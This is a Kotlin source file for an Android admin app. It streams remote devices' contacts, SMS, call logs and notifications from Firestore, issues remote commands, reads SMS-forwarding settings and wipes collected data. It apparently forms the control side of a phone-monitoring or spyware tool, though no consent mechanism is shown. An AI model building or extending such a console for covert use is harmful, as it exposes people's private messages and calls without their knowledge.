package com.datasync.admin.data.repository

import com.datasync.admin.domain.repository.AdminRepository
import android.util.Log
import com.datasync.admin.model.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.snapshots
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.flow.map
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AdminRepositoryImpl @Inject constructor(
    private val db: FirebaseFirestore
) : AdminRepository {

    override fun getDevices(): Flow<List<Device>> {
        Log.d("AdminRepositoryImpl", "ADMIN_LISTENER_STARTED: devices")
        return db.collection("devices")
            .orderBy("heartbeatAt", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { doc ->
                    doc.toObject(Device::class.java)?.let { device ->
                        if (device.deviceId.isBlank()) device.copy(deviceId = doc.id) else device
                    }
                }
                    .also { Log.d("AdminRepositoryImpl", "ADMIN_REALTIME_UPDATED") }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "ADMIN_LISTENER_ERROR: Error fetching devices", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getDevice(deviceId: String): Flow<Device?> {
        Log.d("AdminRepositoryImpl", "ADMIN_LISTENER_STARTED: getDevice $deviceId")
        if (deviceId.isBlank()) return kotlinx.coroutines.flow.flowOf(null)

        return db.collection("devices")
            .document(deviceId)
            .snapshots()
            .map { snapshot ->
                snapshot.toObject(Device::class.java)?.let { device -> if (device.deviceId.isBlank()) device.copy(deviceId = snapshot.id) else device }
                    .also { Log.d("AdminRepositoryImpl", "ADMIN_REALTIME_UPDATED") }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "DETAIL_LISTENER_ERROR: Error fetching device $deviceId", e)
                emit(null)
            }
            .distinctUntilChanged()
    }

    override fun getContacts(deviceId: String): Flow<List<Contact>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .orderBy("name", Query.Direction.ASCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(Contact::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching contacts for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getSMS(deviceId: String): Flow<List<SMS>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(SMS::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching SMS for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getCallLogs(deviceId: String): Flow<List<CallLog>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("calllogs")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(CallLog::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching call logs for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getNotifications(deviceId: String): Flow<List<NotificationData>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("notifications")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(NotificationData::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching notifications for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override suspend fun requestSync(deviceId: String) {
        try {
            db.collection("devices")
                .document(deviceId)
                .set(
                    mapOf(
                        "syncRequestedAt" to System.currentTimeMillis(),
                        "syncStatus" to "Syncing"
                    ),
                    SetOptions.merge()
                )
                .await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error requesting sync", e)
            throw e
        }
    }

    override suspend fun sendCommand(deviceId: String, command: Command): String {
        return try {
            val docRef = db.collection("devices")
                .document(deviceId)
                .collection("commands")
                .document()

            val finalCommand = command.copy(id = docRef.id, createdAt = System.currentTimeMillis())
            docRef.set(finalCommand).await()
            Log.d("AdminRepositoryImpl", "ADMIN_COMMAND_CREATED: ${command.type}")
            docRef.id
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error sending command", e)
            throw e
        }
    }

    override fun getCommand(deviceId: String, commandId: String): Flow<Command?> {
        return db.collection("devices")
            .document(deviceId)
            .collection("commands")
            .document(commandId)
            .snapshots()
            .map { it.toObject(Command::class.java) }
            .catch { emit(null) }
    }

    override fun getSmsForwardingConfig(deviceId: String): Flow<SmsForwardingConfig?> {
        return db.collection("devices")
            .document(deviceId)
            .collection("settings")
            .document("smsForwarding")
            .snapshots()
            .map { it.toObject(SmsForwardingConfig::class.java) }
            .catch { emit(null) }
    }

    override suspend fun deleteItem(deviceId: String, collection: String, itemId: String) {
        try {
            db.collection("devices")
                .document(deviceId)
                .collection(collection)
                .document(itemId)
                .delete()
                .await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting item $itemId from $collection", e)
        }
    }

    override suspend fun deleteAllItems(deviceId: String, collection: String) {
        try {
            while (true) {
                val snapshot = db.collection("devices")
                    .document(deviceId)
                    .collection(collection)
                    .limit(500)
                    .get()
                    .await()

                if (snapshot.isEmpty) break

                val batch = db.batch()
                for (doc in snapshot.documents) {
                    batch.delete(doc.reference)
                }
                batch.commit().await()
            }
            Log.d("AdminRepositoryImpl", "ADMIN_DELETE_ALL_COMPLETED: $collection")

            // After deleting all items, request a full sync and reset count
            val now = System.currentTimeMillis()
            val countField = when (collection) {
                "contacts" -> "contactCount"
                "sms" -> "smsCount"
                "calllogs" -> "callCount"
                "notifications" -> "notificationCount"
                else -> null
            }

            val updates = mutableMapOf<String, Any>(
                "forceFullSyncRequestedAt" to now,
                "syncRequestedAt" to now,
                "syncStatus" to "Full Sync Requested",
                "lastError" to ""
            )
            countField?.let { updates[it] = 0 }

            db.collection("devices")
                .document(deviceId)
                .set(updates, SetOptions.merge())
                .await()
            Log.d("AdminRepositoryImpl", "ADMIN_FORCE_FULL_SYNC_REQUESTED")

        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting all items from $collection", e)
        }
    }

    override suspend fun deleteDevice(deviceId: String) {
        try {
            // Delete sub-collections first
            val collections = listOf("contacts", "sms", "calllogs", "notifications")
            for (collection in collections) {
                deleteAllItems(deviceId, collection)
            }
            // Delete device document
            db.collection("devices").document(deviceId).delete().await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting device $deviceId", e)
        }
    }
}
